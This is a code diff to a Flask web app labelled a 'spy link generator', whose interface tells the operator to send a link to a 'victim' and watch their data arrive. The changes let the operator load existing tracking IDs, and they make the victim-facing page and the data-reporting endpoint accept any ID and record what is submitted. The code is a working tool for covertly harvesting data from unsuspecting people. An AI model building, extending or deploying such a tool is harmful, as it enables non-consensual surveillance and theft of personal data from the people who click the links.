@@ -3,7 +3,7 @@ import os
 import uuid
 import json
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect, url_for
 
 app = Flask(__name__)
 reports = {}
@@ -25,11 +25,18 @@ pre{background:#000;padding:10px;border-radius:10px;overflow-x:auto;}
 <body>
 <div class="card">
 <h2>SPY LINK GENERATOR</h2>
-<p>Generate link and send to victim. When they click, all data will appear below.</p>
+<form method="get" action="/dashboard">
+    <div class="input-group">
+        <input type="text" name="uid" placeholder="Enter UID to view existing, or leave blank for new" value="{{ uid_input }}">
+        <button type="submit">Load UID</button>
+    </div>
+</form>
+<p>Current UID: <strong>{{ uid }}</strong></p>
 <div class="input-group">
 <input type="text" id="link" value="{{ link }}" readonly>
 <button onclick="copyLink()">Copy Link</button>
 </div>
+<p style="color:#aaa;">Send this link to victim. Data will appear below.</p>
 </div>
 <div class="card">
 <h3>Received Data (UID: {{ uid }})</h3>
@@ -43,13 +50,12 @@ pre{background:#000;padding:10px;border-radius:10px;overflow-x:auto;}
         </div>
     {% endfor %}
 {% else %}
-    <p>No data received yet. Send the link to victim.</p>
+    <p>No data received yet for this UID.</p>
 {% endif %}
 </div>
 </div>
 <script>
 function copyLink(){ const i=document.getElementById('link'); i.select(); navigator.clipboard.writeText(i.value); alert('Copied!'); }
-setInterval(()=>location.reload(), 8000);
 </script>
 </body>
 </html>
@@ -99,21 +105,26 @@ def home():
 
 @app.route('/dashboard')
 def dashboard():
-    uid = str(uuid.uuid4())[:8]
-    reports[uid] = {'data': []}
+    uid_input = request.args.get('uid', '')
+    if uid_input and uid_input in reports:
+        uid = uid_input
+    else:
+        uid = str(uuid.uuid4())[:8]
+        if uid not in reports:
+            reports[uid] = {'data': []}
     link = request.host_url.rstrip('/') + '/spy/' + uid
-    return render_template_string(DASHBOARD, link=link, uid=uid, reports=reports)
+    return render_template_string(DASHBOARD, link=link, uid=uid, uid_input=uid_input, reports=reports)
 
 @app.route('/spy/<uid>')
 def spy(uid):
     if uid not in reports:
-        return "Invalid link", 404
+        reports[uid] = {'data': []}
     return render_template_string(SPY_PAGE, server=request.host_url.rstrip('/'), uid=uid)
 
 @app.route('/api/report/<uid>', methods=['POST'])
 def report(uid):
     if uid not in reports:
-        return "Not found", 404
+        reports[uid] = {'data': []}
     data = request.get_json()
     reports[uid]['data'].append({
         'time': datetime.now().strftime('%H:%M:%S'),
